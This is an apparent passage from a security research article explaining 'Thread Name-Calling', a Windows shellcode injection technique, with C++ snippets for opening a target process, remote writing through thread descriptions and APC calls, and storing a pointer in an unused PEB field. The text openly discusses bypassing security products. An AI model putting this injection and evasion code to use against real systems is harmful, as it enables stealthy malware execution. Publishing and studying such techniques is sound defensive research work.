<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">RtlDispatchAPC</span><span class="enlighter-g1">(</span><span class="enlighter-text">shellcodePtr, 0, </span><span class="enlighter-g1">(</span><span class="enlighter-k5">void</span><span class="enlighter-text"> *</span><span class="enlighter-g1">)(</span><span class="enlighter-text">-1</span><span class="enlighter-g1">))</span></div></div></div><div class="enlighter-raw">RtlDispatchAPC(shellcodePtr, 0, (void *)(-1))</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">RtlDispatchAPC(shellcodePtr, 0, (void *)(-1))</pre>



<p class="wp-block-paragraph">Note that&nbsp;<code>RtlDispatchAPC</code>&nbsp;is not exported by name, but, on the tested versions of Windows, we could find it easily by Ordinal 8.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2024/07/TXYQKLGPF9-rId75.png" alt="Figure 1 - RtlDispatchAPC among symbols of NTDLL.DLL"><figcaption class="wp-element-caption">Figure 1 – RtlDispatchAPC among symbols of NTDLL.DLL</figcaption></figure>
</div>


<h2 class="wp-block-heading" id="introducing-thread-name-calling-injection">Introducing Thread Name-Calling injection</h2>



<p class="wp-block-paragraph">Now that we have introduced all the important APIs, let’s dive into the implementation details of Thread Name-Calling. As already mentioned, it is a variant of a technique that allows us to inject a shellcode into a running process (in contrast to the techniques that operate on the process that needs to be freshly created).</p>



<h3 class="wp-block-heading" id="minimal-access-rights">Minimal access rights</h3>



<p class="wp-block-paragraph">Typically, when we want to write a buffer into a process, we need to first open a handle to this process with a write access right (<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights"><code>PROCESS_VM_WRITE</code></a><strong>)</strong>&nbsp;– which may be treated as a suspicious indicator. Thread Name-Calling allows us to achieve the write, and remote allocation, without it.</p>



<p class="wp-block-paragraph">The currently presented implementation requires opening the process handle with the following access rights:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">HANDLE </span><span class="enlighter-m0">open_process</span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD processId, </span><span class="enlighter-k5">bool</span><span class="enlighter-text"> isCreateThread</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    DWORD access = PROCESS_QUERY_LIMITED_INFORMATION </span><span class="enlighter-c0">// required for reading the PEB address</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_VM_READ </span><span class="enlighter-c0">// required for reading back the pointer to the created buffer</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        | PROCESS_VM_OPERATION </span><span class="enlighter-c0">// to set memory area executable or/and allocate a new executable memory</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        ;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">isCreateThread</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        access |= PROCESS_CREATE_THREAD; </span><span class="enlighter-c0">// to create a new thread where we can pass APC</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-m0">OpenProcess</span><span class="enlighter-g1">(</span><span class="enlighter-text">access, </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">, processId</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">HANDLE open_process(DWORD processId, bool isCreateThread)
{
    DWORD access = PROCESS_QUERY_LIMITED_INFORMATION // required for reading the PEB address
        | PROCESS_VM_READ // required for reading back the pointer to the created buffer
        | PROCESS_VM_OPERATION // to set memory area executable or/and allocate a new executable memory
        ;
    if (isCreateThread) {
        access |= PROCESS_CREATE_THREAD; // to create a new thread where we can pass APC
    }
    return OpenProcess(access, FALSE, processId);
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">HANDLE open_process(DWORD processId, bool isCreateThread)
{
    DWORD access = PROCESS_QUERY_LIMITED_INFORMATION // required for reading the PEB address
        | PROCESS_VM_READ // required for reading back the pointer to the created buffer
        | PROCESS_VM_OPERATION // to set memory area executable or/and allocate a new executable memory
        ;
    if (isCreateThread) {
        access |= PROCESS_CREATE_THREAD; // to create a new thread where we can pass APC
    }
    return OpenProcess(access, FALSE, processId);
}</pre>



<p class="wp-block-paragraph">Depending on our needs, Thread Name-Calling can be implemented in different flavors. In the most stealthy (recommended) variant, we do the remote calls using routines added to the APC queue of an existing thread. However, if we want to run it on older versions of Windows, where the new API for APC is not available, and we can’t find alertable threads in our desired target, we may create an additional thread. In such case, the relevant access right needs to be set on our process handle:</p>



<ul class="wp-block-list">
<li><code>PROCESS_CREATE_THREAD</code></li>
</ul>



<p class="wp-block-paragraph">Keep in mind that this change increases the detection ratio of the technique. However, we found some products where it was enough for the bypass.</p>



<p class="wp-block-paragraph">Generally, it is a good practice to minimize the used access rights. Of the ones listed above, we can still avoid using some of them by further refining the implementation. For example:</p>



<ul class="wp-block-list">
<li><code>PROCESS_QUERY_LIMITED_INFORMATION</code>&nbsp;– can be avoided if we don’t use PEB for the pointer storage (details explained later)</li>
</ul>



<p class="wp-block-paragraph">During the injection, we operate on threads of our target process. Regarding the thread handle, these are the minimal required&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights">access rights</a>:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">    DWORD thAccess = SYNCHRONIZE;</span></div></div><div class=""><div><span class="enlighter-text">    thAccess |= THREAD_SET_CONTEXT; </span><span class="enlighter-c0">// required for adding to the APC queue</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    thAccess |= THREAD_SET_LIMITED_INFORMATION; </span><span class="enlighter-c0">// required for setting thread description</span></div></div></div><div class="enlighter-raw">    DWORD thAccess = SYNCHRONIZE;
    thAccess |= THREAD_SET_CONTEXT; // required for adding to the APC queue
    thAccess |= THREAD_SET_LIMITED_INFORMATION; // required for setting thread description</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">    DWORD thAccess = SYNCHRONIZE;
    thAccess |= THREAD_SET_CONTEXT; // required for adding to the APC queue
    thAccess |= THREAD_SET_LIMITED_INFORMATION; // required for setting thread description</pre>



<h2 class="wp-block-heading" id="implementation">Implementation</h2>



<p class="wp-block-paragraph">As is always the case of with remote shellcode injection, the implementation must cover:</p>



<ul class="wp-block-list">
<li>writing our buffer into the remote process’ working set</li>



<li>making it executable</li>



<li>running the implanted code</li>
</ul>



<h3 class="wp-block-heading" id="remote-write-with-the-help-of-thread-description">Remote write with the help of thread description</h3>



<p class="wp-block-paragraph">Let’s have a look at the details of how the remote allocation, along with remote writing, can be implemented with the help of the APIs mentioned earlier.</p>



<ul class="wp-block-list">
<li>As we are implementing code injection, we must start by preparing a proper shellcode. Since we got rid of the NULL byte constraint, we only need to ensure that our shellcode will not be blocking the thread it runs on, and that it has a clean exit.</li>



<li>From our injector application, we need to select a thread within the target, where we can set a thread description containing our shellcode. If we use the new API with Special User APC, we can pick just any thread, but if we use the old API – we must ensure that the selected thread is alertable.</li>



<li>Next, the thread description must be retrieved within the context of the remote process, so that the buffer will be read into the&nbsp;<a href="https://learn.microsoft.com/pl-pl/windows/win32/procthread/process-working-set">process’ working set</a>. This can be achieved by a remote call of the function:</li>
</ul>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">HRESULT </span><span class="enlighter-m0">GetThreadDescription</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">[</span><span class="enlighter-text">in</span><span class="enlighter-g1">]</span><span class="enlighter-text">  HANDLE hThread,</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">[</span><span class="enlighter-text">out</span><span class="enlighter-g1">]</span><span class="enlighter-text"> PWSTR  *ppszThreadDescription </span><span class="enlighter-c0">// &lt;- we get back the pointer to allocated buffer</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">HRESULT GetThreadDescription(
  [in]  HANDLE hThread,
  [out] PWSTR  *ppszThreadDescription // &lt;- we get back the pointer to allocated buffer
);</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">HRESULT GetThreadDescription(
  [in]  HANDLE hThread,
  [out] PWSTR  *ppszThreadDescription // &lt;- we get back the pointer to allocated buffer
);</pre>



<p class="wp-block-paragraph">Remember that the above function automatically allocates a buffer of a required size on the heap, and then fills it in with the thread description. This gives us the remote write primitive together with remote allocation of a buffer with Read/Write access. The pointer to this new buffer will be filled into the supplied variable&nbsp;<code>ppszThreadDescription</code>.</p>



<p class="wp-block-paragraph">Therefore, we need to prepare in advance a memory address within the remote process that can be used as&nbsp;<code>*ppszThreadDescription</code>. It must be an area of a pointer size where the called function&nbsp;<code>GetThreadDescription</code>&nbsp;can write back. There are various options to approach it:</p>



<ol class="wp-block-list">
<li>find some tiny cave in a writable memory of the remote process</li>



<li>utilize some unused fields in a PEB of the remote process</li>
</ol>



<p class="wp-block-paragraph">We decided to utilize an unused field in a PEB because it is very easy to find and retrieve, but we can later replace it with a cave if needed.</p>



<p class="wp-block-paragraph">By checking&nbsp;<a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpebteb.h">fields in the PEB</a>&nbsp;we can find the following:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    PVOID SparePointers</span><span class="enlighter-g1">[</span><span class="enlighter-text">2</span><span class="enlighter-g1">]</span><span class="enlighter-text">; </span><span class="enlighter-c0">// 19H1 (previously FlsCallback to FlsHighIndex)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    PVOID PatchLoaderData;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID ChpeV2ProcessInfo; </span><span class="enlighter-c0">// _CHPEV2_PROCESS_INFO</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ULONG AppModelFeatureState;</span></div></div><div class=""><div><span class="enlighter-text">    ULONG SpareUlongs</span><span class="enlighter-g1">[</span><span class="enlighter-text">2</span><span class="enlighter-g1">]</span><span class="enlighter-text">; </span><span class="enlighter-c0">// ---&gt; unused field, can be utilized to store our pointer</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    USHORT ActiveCodePage;</span></div></div><div class=""><div><span class="enlighter-text">    USHORT OemCodePage;</span></div></div><div class=""><div><span class="enlighter-text">    USHORT UseCaseMapping;</span></div></div><div class=""><div><span class="enlighter-text">    USHORT UnusedNlsField;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    PVOID WerRegistrationData;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID WerShipAssertPtr;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k2">union</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        PVOID pContextData; </span><span class="enlighter-c0">// WIN7</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        PVOID pUnused; </span><span class="enlighter-c0">// WIN10</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        PVOID EcCodeBitMap; </span><span class="enlighter-c0">// WIN11</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span></div></div></div><div class="enlighter-raw">    [...]
    PVOID SparePointers[2]; // 19H1 (previously FlsCallback to FlsHighIndex)
    PVOID PatchLoaderData;
    PVOID ChpeV2ProcessInfo; // _CHPEV2_PROCESS_INFO

    ULONG AppModelFeatureState;
    ULONG SpareUlongs[2]; // ---&gt; unused field, can be utilized to store our pointer

    USHORT ActiveCodePage;
    USHORT OemCodePage;
    USHORT UseCaseMapping;
    USHORT UnusedNlsField;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;

    union
    {
        PVOID pContextData; // WIN7
        PVOID pUnused; // WIN10
        PVOID EcCodeBitMap; // WIN11
    };
    [...]</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">    [...]
    PVOID SparePointers[2]; // 19H1 (previously FlsCallback to FlsHighIndex)
    PVOID PatchLoaderData;
    PVOID ChpeV2ProcessInfo; // _CHPEV2_PROCESS_INFO

    ULONG AppModelFeatureState;
    ULONG SpareUlongs[2]; // ---&gt; unused field, can be utilized to store our pointer

    USHORT ActiveCodePage;
    USHORT OemCodePage;
    USHORT UseCaseMapping;
    USHORT UnusedNlsField;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;

    union
    {
        PVOID pContextData; // WIN7
        PVOID pUnused; // WIN10
        PVOID EcCodeBitMap; // WIN11
    };
    [...]</pre>



<p class="wp-block-paragraph">The field <code>SpareUlongs</code> looks like a good candidate. We can retrieve its exact offset by dumping the PEB with WinDbg:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-generic enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">lkd</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> dt nt!_PEB</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   +</span><span class="enlighter-n2">0x340</span><span class="enlighter-text"> SpareUlongs      </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-g1">[</span><span class="enlighter-n1">5</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Uint4B</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span></div></div></div><div class="enlighter-raw">lkd&gt; dt nt!_PEB
   [...]
   +0x340 SpareUlongs      : [5] Uint4B
   [...]</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">lkd&gt; dt nt!_PEB
   [...]
   +0x340 SpareUlongs      : [5] Uint4B
   [...]</pre>



<p class="wp-block-paragraph">PEB has read/write access, so by finding an unused field of a pointer size, we have the suitable storage where the remotely called function can write back. Keep in mind, that in the future versions of Windows, those fields may be utilized for some system data structures, so this solution must be adjusted accordingly to the updates.</p>



<p class="wp-block-paragraph">First, we retrieve the address of the remote PEB – we can do it by calling the API&nbsp;<code>NtQuerySystemInformationProcess</code>&nbsp;:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-c0">// the function getting the remote PEB address:</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">ULONG_PTR </span><span class="enlighter-m0">remote_peb_addr</span><span class="enlighter-g1">(</span><span class="enlighter-text">IN HANDLE hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    PROCESS_BASIC_INFORMATION pi = </span><span class="enlighter-g1">{</span><span class="enlighter-text"> 0 </span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    DWORD ReturnLength = 0;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">auto</span><span class="enlighter-text"> pNtQueryInformationProcess = </span><span class="enlighter-k3">reinterpret_cast</span><span class="enlighter-g1">&lt;</span><span class="enlighter-k0">decltype</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;NtQueryInformationProcess</span><span class="enlighter-g1">)&gt;(</span><span class="enlighter-m0">GetProcAddress</span><span class="enlighter-g1">(</span><span class="enlighter-m0">GetModuleHandle</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ntdll.dll"</span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span><span class="enlighter-s0">"NtQueryInformationProcess"</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!pNtQueryInformationProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    NTSTATUS status = </span><span class="enlighter-m0">pNtQueryInformationProcess</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        hProcess,</span></div></div><div class=""><div><span class="enlighter-text">        ProcessBasicInformation,</span></div></div><div class=""><div><span class="enlighter-text">        &amp;pi,</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">PROCESS_BASIC_INFORMATION</span><span class="enlighter-g1">)</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        &amp;ReturnLength</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">status != STATUS_SUCCESS</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cerr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"NtQueryInformationProcess failed"</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::endl;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">ULONG_PTR</span><span class="enlighter-g1">)</span><span class="enlighter-text">pi.</span><span class="enlighter-m3">PebBaseAddress</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">// the function getting the remote PEB address:
ULONG_PTR remote_peb_addr(IN HANDLE hProcess)
{
    PROCESS_BASIC_INFORMATION pi = { 0 };
    DWORD ReturnLength = 0;

    auto pNtQueryInformationProcess = reinterpret_cast&lt;decltype(&amp;NtQueryInformationProcess)&gt;(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess"));
    if (!pNtQueryInformationProcess) {
        return NULL;
    }
    NTSTATUS status = pNtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &amp;pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &amp;ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr &lt;&lt; "NtQueryInformationProcess failed" &lt;&lt; std::endl;
        return NULL;
    }
    return (ULONG_PTR)pi.PebBaseAddress;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// the function getting the remote PEB address:
ULONG_PTR remote_peb_addr(IN HANDLE hProcess)
{
    PROCESS_BASIC_INFORMATION pi = { 0 };
    DWORD ReturnLength = 0;

    auto pNtQueryInformationProcess = reinterpret_cast&lt;decltype(&amp;NtQueryInformationProcess)&gt;(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess"));
    if (!pNtQueryInformationProcess) {
        return NULL;
    }
    NTSTATUS status = pNtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &amp;pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &amp;ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr &lt;&lt; "NtQueryInformationProcess failed" &lt;&lt; std::endl;
        return NULL;
    }
    return (ULONG_PTR)pi.PebBaseAddress;
}</pre>



<p class="wp-block-paragraph">Having the base address of the PEB, it is enough to add the known offset of the unused field, to get its pointer in the context of the remote process:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">ULONG_PTR </span><span class="enlighter-m0">get_peb_unused</span><span class="enlighter-g1">(</span><span class="enlighter-text">HANDLE hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ULONG_PTR peb_addr = </span><span class="enlighter-m0">remote_peb_addr</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!peb_addr</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cerr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Cannot retrieve PEB address!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k8">const</span><span class="enlighter-text"> ULONG_PTR UNUSED_OFFSET = </span><span class="enlighter-n2">0x340</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k8">const</span><span class="enlighter-text"> ULONG_PTR remotePtr = peb_addr + UNUSED_OFFSET;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> remotePtr;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">ULONG_PTR get_peb_unused(HANDLE hProcess)
{
    ULONG_PTR peb_addr = remote_peb_addr(hProcess);
    if (!peb_addr) {
        std::cerr &lt;&lt; "Cannot retrieve PEB address!\n";
        return NULL;
    }
    const ULONG_PTR UNUSED_OFFSET = 0x340;
